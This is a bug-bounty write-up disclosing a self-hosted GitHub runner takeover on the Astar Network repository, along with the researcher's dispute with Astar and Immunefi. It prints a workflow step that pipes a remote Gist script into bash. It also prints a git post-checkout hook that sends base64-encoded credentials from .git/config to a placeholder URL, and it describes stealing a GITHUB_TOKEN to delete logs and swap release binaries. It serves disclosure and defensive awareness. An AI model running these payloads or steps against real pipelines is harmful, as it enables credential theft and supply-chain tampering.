---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-01-19_web3s-achilles-heel-a-supply-chain-attack-on-astar-network.md
original_filename: 2024-01-19_web3s-achilles-heel-a-supply-chain-attack-on-astar-network.md
title: 'Web3’s Achilles’ Heel: A Supply Chain Attack on Astar Network'
category: documents
detected_topics:
- supply-chain
- sso
- idor
- access-control
- command-injection
- otp
tags:
- imported
- documents
- supply-chain
- sso
- idor
- access-control
- command-injection
- otp
language: en
raw_sha256: 411b01c4acfd2ad9cf95e7f7ee40c6d2f33c7e7b93059095dec776dd75aa3d42
text_sha256: bed5c8441893ab82f2a55cfda02f81b7144ab384f2ae5f4d3d349ecb5cd44eb8
ingested_at: '2026-06-28T07:32:30Z'
sensitivity: unknown
redactions_applied: false
---

# Web3’s Achilles’ Heel: A Supply Chain Attack on Astar Network

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-01-19_web3s-achilles-heel-a-supply-chain-attack-on-astar-network.md
- Source Type: markdown
- Detected Topics: supply-chain, sso, idor, access-control, command-injection, otp
- Ingested At: 2026-06-28T07:32:30Z
- Redactions Applied: False
- Raw SHA256: `411b01c4acfd2ad9cf95e7f7ee40c6d2f33c7e7b93059095dec776dd75aa3d42`
- Text SHA256: `bed5c8441893ab82f2a55cfda02f81b7144ab384f2ae5f4d3d349ecb5cd44eb8`


## Content

---
title: "Web3’s Achilles’ Heel: A Supply Chain Attack on Astar Network"
page_title: "Web3''s Achilles'' Heel: A Supply Chain Attack on Astar Network | Adnan Khan - Security Research"
url: "https://adnanthekhan.com/2024/01/19/web3s-achilles-heel-a-supply-chain-attack-on-astar-network/"
final_url: "https://adnanthekhan.com/2024/01/19/web3s-achilles-heel-a-supply-chain-attack-on-astar-network/"
authors: ["Adnan Khan (@adnanthekhan)"]
programs: ["Astar Network"]
bugs: ["Supply chain attack", "Self-Hosted Runner Takeover", "CI/CD"]
publication_date: "2024-01-19"
added_date: "2024-02-06"
source: "pentester.land/writeups.json"
original_index: 515
---

#  Web3''s Achilles'' Heel: A Supply Chain Attack on Astar Network 

January 19, 2024  28 min read  adnanthekhan 

[ bugbounty ](/tag/bugbounty/)[ cicd ](/tag/cicd/)[ github ](/tag/github/)[ security ](/tag/security/)[ supplychain ](/tag/supplychain/)[ astar ](/tag/astar/)[ crypto ](/tag/crypto/)[ defi ](/tag/defi/)[ web3 ](/tag/web3/)

## Overview

[John Stawinski](https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/) and I have been conducting research and submitting bug bounty reports focusing on a specific type of poisoned pipeline execution attack that I like to refer as “Self-Hosted Runner Takeover”. It manifests when a public repository has an attached non-ephemeral self-hosted runner without requiring approval for workflows on the `pull_request` trigger.

One of the organizations we discovered the vulnerability in was Astar network. According to [Wikipedia](https://en.wikipedia.org/wiki/Astar_Network), Astar Network is a blockchain that aims to become Polkadot’s “smart contract hub” and serves as a parachain for Polkadot.

![](/_astro/images/12885-1.CZ3Q-4Sj_Z2eJAvC.webp)

The vulnerability allowed _**anyone**_ who could fix a typo in the `astarNetwork/astar` repository to modify the release binaries for their validator nodesand `wasm` runtimes, **meaning they could cause a loss of funds.**

We conducted our standard proof-of-concept (POC) of fixing a typo and persisting on the runner using the “runner-on-runner” technique described in detail within [One Supply Chain Attack to Rule Them All](/2023/12/20/one-supply-chain-attack-to-rule-them-all/) and [Playing with Fire](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/). We’ve certainly had varying reactions to our approaches by internet commentators. Overwhelmingly we’ve learned that, outside of a few exceptions like [Google’s VRP](https://bughunters.google.com/), programs will generally try to pay for a severity that aligns with the lowest level of impact that is irrefutable. This is especially the case for newer bug types that triage analysts are not familiar with. Everyone knows how to triage a subdomain takeover and assign impact, but CI/CD and supply chain vulnerabilities are not common knowledge amongst most triage analysts.

If there is any “potential” mitigating factor such as “a validation process” (that wouldn’t catch a skilled attacker), it will generally go in the programs favor, and not the researcher’s. Immunefi has been a very difficult platform to submit CI/CD vulnerabilities to, and other bug bounty hunters who discover non smart-contract vulnerabilities within Web3 companies can likely attest to this.

### How does this impact you?

At this current point, the **AStar security team mitigated the self-hosted runner vulnerability by requiring approval for fork PR workflows** so an attacker cannot create a pull request and poison releases by shelling the runner.

However, there is a broader consideration when it comes to the operation of their security team. If you hold ASTR tokens, or you have funds locked within the Astar Network, you should think about how their security team operates, as that has a **direct** impact on the security of **your** hard earned funds. Security teams that do not respect responsible disclosure discourage future researchers from disclosing vulnerabilities.

A possible result is that threat actors who previously would have submitted the vulnerability to AStar’s bug bounty program may now be more incentivized to sell their vulnerability to the highest bidder. I don’t condone that behavior, and strongly condemn all malicious actions, but am making this point to show the risk involved with the actions of AStar’s security team.

Your funds might not be as safe on AStar as they are on a Web3 ecosystem that values good faith responsible disclosure. **Make your decisions wisely.**

## Astar Network Submission

Recently, I submitted a report to Astar Network, which is a Polkadot parachain and runs a bug-bounty program through Immunefi. As part of the submission, as we have done for most of our Web3 reports, I carried out a benign proof-of-concept against the repository in order to prove impact to an in scope component. This is essential because we have had reports closed or paid at a much lower amount in the past for reasons such as “we have additional validation measures” (without explanation of what they are or how they would catch tampering with releases). In these cases Immunefi was of no help. The key for Web3 submissions for this vulnerability class is impact to in-scope components. Generally, repository CI/CD compromise is not listed as an “in-scope” impact, so I’ve found that CI/CD vulnerabilities are only accepted if I can leverage them to impact a system that is listed as in-scope.

### On Web3 Security

I want to preface the technical details by saying that I am **not** a blockchain security expert, my expertise is in red teaming with a specialization in CI/CD and supply chain security. I’ve had to read up a lot on how Web3 security works along with Polkadot and its parachains, and I’m still a beginner there. I try to operate with a “if you say it, then be sure to back it up” mindset, so I strive to make sure my claims here are accurate. If I’m making an incorrect statement, then by all means, call me out. My email is linked in my blog, tell me if I’m wrong and why, and I will gladly correct the blog to reflect that, and credit you for the correction if you would like.

## Good Faith is a Two-Way Street

About 8 days after my submission, I was banned without prior warning from Immunefi for “exploiting a vulnerability against a project far beyond what was needed to demonstrate the vulnerability’s existence.” This was after responsibly disclosing [other vulnerabilities through their platform and others](https://www.securityweek.com/major-it-crypto-firms-exposed-to-supply-chain-compromise-via-new-class-of-ci-cd-attack/), improving the security posture of prominent crypto programs, and typically being met with gratitude by security teams. In all cases, I took utmost care _not_ to cause any harm with my POC, as you will see within the technical details. In the case of Astar, the only change the project needed to make was to re-upload releases to a low priority release that was published over two weeks prior.

![](/_astro/images/banhammer.BZ6OMghq_1LRAiv.webp)

The biggest red flag on Astar’s part was delivering a heavy handed response against someone seeking to make a good faith disclosure without _**any**_ effort at a discussion, Immunefi didn’t exactly do that either. At the very least, respect the time and effort the researcher put into their submission and engage in a discussion.

After confidentially reaching out to Astar and Immunefi to have a discussion, it became clear they were not interested in talking any further to reach an outcome that was fair for both myself and Immunefi. The downside is that I won’t get paid for discovering a critical vulnerability in Astar. The upside is that I get to write about this attack path and use Astar to shine a light on this type of vulnerability so that other organizations can protect themselves.

Normally, I would hold this information in strict confidentiality, as I take the confidentiality of all of my bug reports very seriously, even those that lowball the payout and leave me bitter - I might be unhappy, but I still uphold my end of the bargain. **This time, however, is different, so let’s get to what you probably clicked on this link for.**

This blog post is a complete disclosure of the vulnerability within Astar’s repository (which is now fixed), the attack, the demonstration of impact, as well as an example for programs of how _**not**_ to handle a submission from a good-faith security researcher.

**Let’s get to it.**

## Discovery

Armed with [Gato](https://github.com/praetorian-inc/gato), a tool purpose built for finding GitHub CI/CD vulnerabilities, I simply had to run it on the Astar organization to discover the non-ephemeral self-hosted runner attached to the Astar repository.

![](/_astro/images/image-28.C_cUk-u2_ixCHK.webp)

The screenshot above was taken after their mitigation, in case you notice the different runner name. The repository still uses a non-ephemeral self-hosted runner, but they have mitigated the risk by requiring approval for fork PR workflows.

Typically, the flow John and I used for self-hosted runner takeover is as follows:

![](/_astro/images/general_chain-1.BzrvC0P6_Z1PNuJu.webp)

I could not determine based on observing previous PRs if approval was required, so I created a simple typo and grammar fix PR.

![](/_astro/images/image-19.CDi6H96S_gBvy9.webp)

Fixing a typo is essential because Immunefi does not accept theoretical submissions, and a POC is clearly required. The only way to prove the requirements and failures in checks (such as any unseen on-host mitigations, or validation controls that are not immediately apparent) is to follow through with the chain and prove impact to an in-scope component.

![](/_astro/images/image-38.CJ1hnjEl_ZWwQMD.webp)

## Attack Chain

Once I completed the pre-requisite step of becoming a contributor, I conducted a series of actions to carry out my plan of proving that I could make a benign modification to the Astar validator release, as that was the only path from this repository to an in-scope impact within the Blockchain/DLT category.

### Shelling the Runner

First, I created a pull request to test the approval requirement. If my workflows on pull request did not require approval, they would run immediately. If approval was required, I wouldn’t be leaving a POC in a pending approval state, I would just have a small README change. You can tell that I cared about not raising undue alarm here.

![](/_astro/images/image-31.Dl_-TAQG_Z161gce.webp)

Once the `enforce-labels.yml` workflow ran without approval (as that ran on the `pull_request` trigger, I updated the `coverage.yml` within my fork to a payload and removed the `enforce-labels.yml` file.
  
  
  name: Code coverage
  on:
  pull_request:
  types: [synchronize]
  jobs:
  coverage:
  runs-on: [self-hosted, Linux, X64]
  steps:
  - name: Free disk space
  run: curl -sSfL https://gist.githubusercontent.com/Amb1guousRaccoon/8adf0cea8c7f3463871362f
  2a2aa149d/raw/06428911cce5049cfc5271b5fed40c5b0323cad9/test.sh | bash

Since I determined that workflows on the `pull_request` trigger did not require approval for contributors, I pushed an updated workflow to deploy persistence on `devserver-01`. You can see that the workflow pulled from a Gist in order to install another self-hosted GitHub Actions runner on the machine. This is the runner-on-runner (RoR) technique that I first used when I discovered [One Supply Chain to Rule Them All](/2023/12/20/one-supply-chain-attack-to-rule-them-all/).

You can see that the payload pulled down a script from a Gist.

![](/_astro/images/grammar_fixes_run.DvyFgMPK_ZxNBnK.webp)

Once it finished, I closed the PR by force-pushing off my last two commits.

![](/_astro/images/pr_force_push.Bc2YE_c8_ZsPmBJ.webp)

The Gist itself contained a bash script to register a self-hosted runner to my C2 repository. I won’t share that script here yet, but if you read [GitHub’s API documentation on on self-hosted runners](https://docs.github.com/en/rest/actions/self-hosted-runners) you could probably figure out the steps need to retrieve a runner registration token, download the runner binaries, and connect that runner to your C2 organization or repository.

### On-Host Enumeration

After I obtained persistence on the runner, I ran commands from my “web shell” to figure out if there was anything on the runner of use to me. You can see from the output below that the runner allowed running sudo with nopasswd for all commands. This is more often than not what we get when we land on a self-hosted runner.

![](/_astro/images/sudo_nopasswd.CX_Afc-6_Z21uGIE.webp)

I could have performed network scanning, but lateral movement was not in-scope so I was focused on demonstrating impact via the releases, and I did not want to set off any network monitoring alarms. RCE as root on a persistent build agent is already pretty bad, but for most Web3 programs (including Astar) this impact does not count as an in-scope vulnerability since it does not affect the actual in-scope source code. Some programs might pay a small bounty of a few hundred as a thank you, and others will close it as out of scope. For a more involved vulnerability like this that is not worth the time necessary to discover, demonstrate, and write a report.

**So, onwards!**

I also checked the `.bash_history` file. I saw that GitHub’s output redacted a secret. This means that it’s likely a PAT used for HTTPS authorization. I was pretty excited at this point because it could be an easy way to prove impact without needing for wait for another build and `GITHUB_TOKEN`.

![](/_astro/images/webshell_pat-1.D7NboegM_YIM8Q.webp)

I Base64 encoded it and printed the output again. Ooh it was a PAT! At this point I was quite happy.

![](/_astro/images/image-23.CLx62OIL_1KMBL6.webp)

I quickly fired off Gato and learned that the PAT was invalid. Darn! Can’t win them all! It was very likely a matter of timing because PATs are created with a default 30-day expiration window.

Still, leaving a PAT in bash history on a self-hosted runner attached to a _**public**_ repository? **That is carelessness**.

### Capturing the GITHUB_TOKEN

Since I did not find anything on the filesystem that I could use to prove impact to an in-scope component, I returned to my original plan of capturing the `GITHUB_TOKEN` from a subsequent build and extending it’s lifetime. The `GITHUB_TOKEN` is valid only for the duration the build, so I needed to find a way to make a build last longer. I could add a sleep to any file I wanted, but I chose a file that I knew would always run. Meet the `post-checkout` hook!
  
  
  #!/bin/bashcat .git/config | grep "AUTHORIZATION" > /dev/null
  RESULT=$?if [ $RESULT -eq "0" ]; then
  curl -s -d `cat '.git/config' | base64 -w 0` https://<BURL_URL>/hook > /dev/null
  sleep 900
  fi

Git offers several scripts that run on various events. These must be configured after cloning a repository, but because non-ephemeral self-hosted runners retained the checked out repository, one can place a hook script within the `.git/hook` s/ directory and it will run based on the event associated with the filename. The `post-checkout` hook, as you might guess, runs after the `git checkout` event. The hook file I used checked if the `.git/config` file contained credentials, and if it did, it sent the file to my collaborator URL and slept for 900 seconds - or 15 minutes.

![](/_astro/images/long_checkout.BiY00sVp_1FhVNi.webp)

You can see above that the checkout took 15 minutes, this was due to the 900 second sleep within the post checkout hook. And I received the contents of the file in a nice Base64 encoded blob!

![](/_astro/images/new_token.CK8xwZxY_ZaDHeX.webp)

Now, I took the `AUTHORIZATION` header and decoded it to capture the `GITHUB_TOKEN`. I used it, along with GitHub’s API, to delete the workflow run logs associated with my initial implantation of the runner. At this point I was safely on the runner and could take my time to plan the POC in order to demonstrate that I could tamper with releases.

## Release Tampering Proof-of-Concept

In order to prove that I could modify a release in a manner that would fit the Critical impact, I had to create a functioning validator node binary that contained my benign POC. I ended up creating a copy of the Astar repository in my own private organization.

In my repository, I modified the `main.rs` file to contain a simple print statement.

![](/_astro/images/image-20.BTlekXqE_2eRQgq.webp)

In order to compile it, I just used their runner attached to my organization because I didn’t want to wrestle with getting a rust toolchain set up. Yes, you read that right, I used their build agent to build the POC binary. This had a dual purpose. One, it was easy to set up, and two, it minimized the risk of introducing external code due to my toolchain configuration into this POC binary.

It worked perfectly and I had the binaries with the modification I needed. Keep in mind the binaries had the same legitimate code from Astar’s repository, just with the print statement added.

You can see how the mirror build looked like on my mirror repository:

![](/_astro/images/image-32.BP-mpONB_Z1GixKX.webp)

Notice how this mimics the release workflow of the actual Astar repository:

![](/_astro/images/image-33.C-ZiNHOM_Zjf5DQ.webp)![](/_astro/images/mirror_release.Bx0QYUu6_2pq1Mq.webp)

I downloaded the package and confirmed that I could see the POC text. Everything was ready for what I _thought_ would be a completely benign POC where the program couldn’t argue away the impact, because I wanted to prove that controlling validators meant controlling or at least having significant impact on the Parachain.

![](/_astro/images/benign_modification.CHZ6ggHQ_ZlT3c2.webp)

In hindsight, I should have added a different message. Even though this release was two weeks old, there was still a _very_ small chance that someone would download the release, run this binary, and go tell a bunch of people that “Astar got hacked” before Astar had time to replace the binary in the period of time between uploading it and Astar removing it after my report. Furthermore, this was a low priority runtime-only release, with no modification to the clients (and I did not modify the runtimes as part of my POC). As you will see, I also aimed to submit the report immediately after the swap as to minimize this impact.

Adding a benign binary modification achieved the goal of impacting an in-scope component, but the modification could have been more subtle. Keep in mind that at this point, myself or John had this level of access multiple times to various crypto programs, and had been denied bounties because we _hadn’t_ overtly proved that we could make a binary modification. So I opted to make the modification. This also served a purpose to counter any claims that there are monitoring or validation processes in place. In theory an organization could monitor release asset updates via GitHub’s audit log. And if a program responded with a claim that they monitor logs, and that the attack would not cause impact, then I would be unable to counter that claim.

At this point I drafted my report in Immunefi and had everything ready to go. I did not want to leave the releases up without the program knowing about the report. My hope was that the program would see the escalated report and quickly remove the binaries (and hopefully verifying them to confirm my PoC).

![](/_astro/images/release_mod.drawio.BATbaZ7n_24aX3.webp)

Once my binaries were ready to go, I used [GitHub’s Releases API](https://docs.github.com/en/rest/releases/releases?apiVersion=2022-11-28) along with the `GITHUB_TOKEN` stolen from a build to take the following steps:

  * Delete two previous release binaries 
  * I had originally planned to only replace the x86_64 binary, but I accidentally deleted the wrong asset ID, so I ended up having to upload two.
  * Upload two new release assets from my machine.

I uploaded them, took screenshots, and **immediately** submitted the report to Immunefi. This way, if they did notice any issue on the release page prior to seeing the report, they could deconflict it with the Immunefi report. The _only_ visible indication on their GitHub page would be the timestamps and of course the hashes of the assets.

![](/_astro/images/releases_tampered-1.DtAhXFyK_Z1EBhKW.webp)

Astar’s team removed my binaries shortly after the report was escalated and re-uploaded them with clean binaries. No harm was done, there was no damage to funds, system stability, and even program reputation, and only a minor inconvenience for their team to re-upload the binaries. At least that’s what I thought, but such is life.

## Impact

For this report, the primary impact that I framed my report around was the ability to modify release binaries via the `GITHUB_TOKEN`, since I wanted to prove high or critical impact via code execution on validator nodes. There were not any secrets of note that someone could steal from the repository, so the only way to achieve impact to an in-scope component would be to _irrefutably_ demonstrate that an attacker could modify releases.

Astar Network’s documentation outlined that downloading the binaries is the easiest way to install an Astar node. This attack would not impact anyone building from source, which the documentation also covered.

![](/_astro/images/image-21.DbJOlHOF_1FOAy2.webp)

This means that the script blindly downloaded the binaries from the GitHub releases page, so the GitHub releases page is the source of truth for binaries and runtimes. You can go to <https://github.com/AstarNetwork/Astar/releases/tag/v5.28.0>, and see that it now contains a note saying that the clients were rebuilt on 01-08-2024, without any reason given as to why.

Well, now you know the reason!

Now, let’s talk about how they re-uploaded their releases and how they communicated this to their users, because it points to more security gaps, along with a mismatch between the concerns raised by their point of contact over Discord and reality. The message I mentioned earlier gave a reason for the release containing new binaries.

![](/_astro/images/release_updated.C_JQgxs-_Z2bl0Fr.webp)

Interestingly, this message doesn’t accomplish _anything_ from a security standpoint on GitHub. An attacker with the ability to write to releases could simply update the release message as well using GitHub’s API. This could provide cover for a modified release, in case someone questioned the modified timestamps.

If Astar was indeed genuinely concerned about the security of the newly uploaded binaries, as they claimed, they would have notified their users by publishing an announcement on their Discord channel saying that they had to rebuild the binaries due to a security report from their bug-bounty program, they’ve secured their system, that the new binaries are safe, and any release binaries downloaded on January 8th, but prior to ~4:25 PM EST should be discarded. This would have indicated to users that:

  * Astar takes security seriously
  * Astar is transparent about any security issue that could have impacted their users, no matter how small the likelihood.

Unfortunately, Astar does not appear to operate transparently when it comes to security.

### Transparency is a Must

Generally, companies with good security practices aim to be as transparent as possible with their users, especially in the Web3 industry. If they suffer an incident of any kind, be it from a bug bounty or a threat actor that could have had an impact on their users, they disclose it along with the steps they have taken and plan to take. In almost every case this is a better approach, both for security and their reputation.

#### The Wrong Way 👎

![](/_astro/images/image-36.DZy2hgKO_ZRG8qb.webp)

Given that one of the primary reasons Astar gave me for handling this the way they did was the seriousness of the PoC to them. If it was this serious, then doing right by their community would mean promptly announcing this to their users. Astar did not make an announcement on their Discord channel aligning with the message on the release. This indicates that either Astar did not _actually_ consider the binary malicious (which is the likely case, I submitted a report to Immunefi and clearly documented what the change was), or they did and wanted to cover it up rather than notifying their users.

If Astar’s security team was so concerned about my PoC and how it could have caused a risk to their users, then **why didn’t disclose this promptly?**

You can come to your own conclusion about the answer to that question.

#### The Right Way 👍

![](/_astro/images/image-35.DNGjkdxy_Z1VNGBk.webp)

One of the first reports we made was to [Chia Network](https://www.chia.net/). They published a [blog post](https://www.chia.net/2023/08/04/bug-bounty-self-hosted-runners/) about the report I made along with their response. They even went as far as outlining the specific events and observables from their end, what steps they took in response, and how they plan to improve security for their CI/CD setup going forward.

Companies that handle incidents or reports in this manner should be looked up to as a positive example for doing things the right way. Their users can trust that they are not kept in the dark about something that could have impacted them.

### What Would a Threat Actor Do?

I always like to go over what an actual threat actor could do if they had the skills and motivation to cause the most damage possible. The GitHub part of the attack chain was not terribly complex, it required several steps and knowledge of GitHub Actions, but with the techniques out there it’s little more than using tools like Gato to scan and being comfortable with Bash and Curl. Let’s suppose an APT wanted to get the most out of this. **What would they do?**

![](/_astro/images/image-40.CDiEpRE3_d0mXG.webp)

A real attacker wouldn’t simply make an update _weeks_ after a low-priority runtime-only release; instead, they would wait until a _legitimate_ release and upload their malicious artifact immediately, or they could simply conduct a [Solar Winds](https://www.wired.com/story/the-untold-story-of-solarwinds-the-boldest-supply-chain-hack-ever/) style attack and modify the source code prior to compilation on the agent. Remember that `post-checkout` hook? Yeah, **that would be a great time for a nice sed command against a specific source file.** This would ensure that their modified binaries would hide in plain sight and not be reflected in the source code. There would not be any timestamp variation or release update audit log events. If an attacker did this, **then the only way to know would be to reverse-engineer the binary.**

Some attackers would simply add a backdoor trojan, information stealer, or a crypto miner to the binary using off the shelf malware. However, this would be easy to catch for most reverse engineers and most likely EDR software. A particularly devious attacker could introduce a logic error into the binary that could be triggered via an on chain event that they initiate (such as sending a specific amount to a specific address). A modification like this would be necessary for an attacker to conduct an attack where they poison the majority of parachain validators after a high-priority client release. Their aim would be to make sure there was nothing suspicious until _after_ they are certain that the majority of validators have updated to their malicious binary.

This would not be caught by traditional supply chain analysis tools that look for more obvious signs of a backdoor, and would require meticulous reverse engineering of business logic to identify a deviation from source code.

In short - **no one would find out until after it was too late**. This is what makes supply chain attacks like this so terrifying.

Finally, the worst kind of attack would be one where an attacker seeds to modify the code for the majority of validator nodes on Astar. This would have a severe impact, because while runtimes are updated through a governance process using the Polkadot validator nodes, it is the Astar validator nodes that ultimately process the runtimes for the Astar parachain. If an attacker managed to tamper with the majority of validator nodes (such as during a high priority client release), then they could have a significant impact on the integrity and stability of the Astar parachain.

Think of it like controlling a hypervisor and owning the host operating system.

Obviously, I did not perform any actual malicious actions, and only wanted to exercise the technical path of the attack chain to ensure that the program could not shoot down my claims. Unfortunately all that careful planning to prove impact while limiting harm to Astar went to waste due to a surprise ban from Immunefi on January 16th without any communication from Astar or Immunefi prior to receiving that notification. It’s moments like these that make you question why white hats even bother, but alas, here we are. Other bug bounty hunters can probably relate to this. It’s often damned if you do, damned if you don’t with many programs.

## But the Banhammer?

So yes, I was banned from Immunefi. I doubt I can return to that platform as I was KYCd and they would ban me again, and after this experience I wouldn’t even want to use that platform.

**On January 26th, after a discussion with Immunefi regarding my ban, my account was reinstated!** There is hope after all. Immunefi will also update their PoC rules to clearly provide guidelines for supply chain attacks. This will ultimately lead to a smoother experience for whitehats such as myself.

I had no other pending disclosures on Immunefi, so I did not lose out on anything beyond the potential Astar payout. It was abundantly clear based on the lack of any response from the program prior to the ban that they had no interest in handling this in good faith. This is the first Web3 program that has responded to one of my disclosures in the manner that Astar did. While _those_ reports will remain confidential, I am opting to share this report and all related details.

I am sharing this report about Astar to highlight these CI/CD vulnerabilities and how they can impact Web3 companies along with shining a light on a _very_ poor experience with both Astar and Immunefi. I’ve always wanted to talk about this vulnerability class in the context of a Web3 company, but I strictly value the confidentiality of my reports submitted to bug bounty programs.

If anyone from one of the other Web3 programs myself or [John Stawinski](https://johnstawinski.com/) submitted a report to is reading this:

**Thank you** for upholding your end of the bargain, even if in some cases the payouts might have been a little disappointing, or you even closed the reports due to scope, we still respect you, even if we do not agree with you.

### A Silver Lining

Fortunately, there is a silver lining to all of this. And that is ultimately for your benefit, because you get to read about it, and the benefit of other Web3 companies. While this attack chain focused on GitHub Self-Hosted Runners, supply chain attacks are a **very real** risk, and they are only getting worse. Just looking at ReversingLabs State of Supply Chain security report for 2024, there has been a 1300% increase in malicious open source packages.

![](/_astro/images/image-37.CuOOPFGe_Z2g3uQ.webp)

Since Web3 companies overwhelmingly open source their core code, attackers typically have substantial visibility into the CI/CD processes of their targets, and can find gaps in the release process before even conducting a single malicious action. From this, they can map out what they need to compromise in order to achieve their goals.

The [Ledger Supply Chain Attack](https://thehackernews.com/2023/12/crypto-hardware-wallet-ledgers-supply.html) put the attack type on the map for both Web3 companies _and_ attackers. Threat actors are only going to get smarter and more effective at conducting supply chain attacks.

The serious gaps in many Web3 company’s supply chain posture, such as the issues with Astar, means that they are both _easy and lucrative_ targets.

Web3 companies should holistically evaluate their threat model and ensure that they factor in supply chain risks like these. What if an attacker steals a PAT from a developer who has write access to the Astar repository with the `repo` scope? Guess what, **they can achieve this same impact** with a single PAT. This applies to many other Web3 companies that release critical binaries through GitHub.

Just like Web3 companies publish audits of their smart contracts and software code to the public, they should publicly document their supply chain security measures.

## Disclosure Timeline

  * **January 8th, 2024** \- Report Submitted via Immunefi
  * **January 8th, 2024** \- Report Escalated to Project
  * Jan **uary 10th, 2024** \- Received a message from Astar thanking me for the submission and that they are looking into the report.
  * **January 16th, 2024** \- Received an email saying that I had been banned from Immunefi for “for exploiting a vulnerability against a project far beyond what was needed to demonstrate the vulnerability’s existence”. 
  * This really comes down to semantics, because projects can and will deny impact. Going too far would be adding malware to a release, adding a benign print statement to a two week old low-priority release (which they easily fixed) is not, and at the very least lead to an open discussion, not an outright ban.
  * **January 16th, 2024** \- Opened a support ticket with Immunefi for the opportunity to have a discussion regarding why they reacted in the manner they did.
  * **January 16th, 2024** \- Opened a support ticket with Astar on their Discord asking for the opportunity to have a discussion with their security team.
  * **January 17th, 2024** \- Back-and-forth with a point of contact from the Astar security team along with some bull about “We can’t trust it was a benign POC”. If I was a real attacker and had uploaded an _actually_ malicious binary, do you think I would then report myself to Immunefi? It almost seems like Astar wasn’t interested in handling this in good faith from the beginning.
  * Jan **uary 18th, 2024** \- Informed Astar that I plan to publicly blog about and talk about the report in full detail, and offered to allow their team to review the post prior to publication, if they desired, and that the lack of a response my message in a timely manner would indicate ‘no’.
  * **January 19th, 2024** \- Received a response saying that they are happy to review and comment, but need to ask permission from Immunefi. I informed them that my offer to allow them to review was not to benefit me, but as a good faith favor to them. Given the lack of any communication from Immunefi beyond the ban message, I informed them to not bother with asking, and that I would be moving forward with publication.
  * **January 19th, 2024** \- Publication.

Overall, this takes the prize as the **_worst_** disclosure that I have ever been involved in throughout this entire process of finding and reporting CI/CD vulnerabilities.

## Conclusion

Web3 and DeFi offers security guarantees through smart contracts and decentralized governance; however, for networks such as Astar, where the parachain is handled by validator nodes that are built and released to a centralized source (GitHub repositories), this introduces a centralized component, and one that is not subject to governance, proposals, or on-chain democracy. This is in contrast to larger networks where there is a mutually agreed upon protocol, and individual clients must simply implement it. This prevents a single point of failure.

_Anyone_ with write access to a repository can modify releases and assets, and in this case, as I demonstrated through the self-hosted runner vulnerability, anyone who submits a few typo fixes could achieve the same for Astar. Forget governance, forget democracy - just a bit of ChatGPT and a pull request.

CI/CD security is tightly intertwined with supply chain security, and as supply chain attacks increase in frequency and severity, so too will CI/CD attacks. Web3 companies in particular should carefully monitor their CI/CD systems closely, institute defense in depth measures both in the form of preventative and detective controls. For GitHub repositories, this means monitoring releases, requiring approval for pull requests, and instituting least privilege principles for workflow permissions.

![](/_astro/images/image-39.BHdc3xvT_Z2vpsbQ.webp)

For CI/CD self-hosted runners, this means aiming to implement SLSA build standards to ensure isolation between builds and securing the control plane from malicious actors. Implementing EDR and monitoring of build systems adds another layer of defense to help catch malicious actors before they are able to do damage.

## References

  * [/2023/12/20/one-supply-chain-attack-to-rule-them-all/](/2023/12/20/one-supply-chain-attack-to-rule-them-all/)
  * <https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/>
  * <https://docs.astar.network/docs/build/nodes/collator/secure_setup_guide/building_node#build-from-binaries>
  * <https://www.reversinglabs.com/blog/the-state-of-software-supply-chain-security-2024-key-takeaways>
  * <https://docs.github.com/en/rest/releases/releases?apiVersion=2022-11-28>
  * <https://slsa.dev/spec/v0.1/requirements>

##  On this page 

  * Overview
  * How does this impact you?
  * Astar Network Submission
  * On Web3 Security
  * Good Faith is a Two-Way Street
  * Discovery
  * Attack Chain
  * Shelling the Runner
  * On-Host Enumeration
  * Capturing the GITHUB_TOKEN
  * Release Tampering Proof-of-Concept
  * Impact
  * Transparency is a Must
  * What Would a Threat Actor Do?
  * But the Banhammer?
  * A Silver Lining
  * Disclosure Timeline
  * Conclusion
  * References

Tags: [ #bugbounty ](/tag/bugbounty/)[ #cicd ](/tag/cicd/)[ #github ](/tag/github/)[ #security ](/tag/security/)[ #supplychain ](/tag/supplychain/)[ #astar ](/tag/astar/)[ #crypto ](/tag/crypto/)[ #defi ](/tag/defi/)[ #web3 ](/tag/web3/)
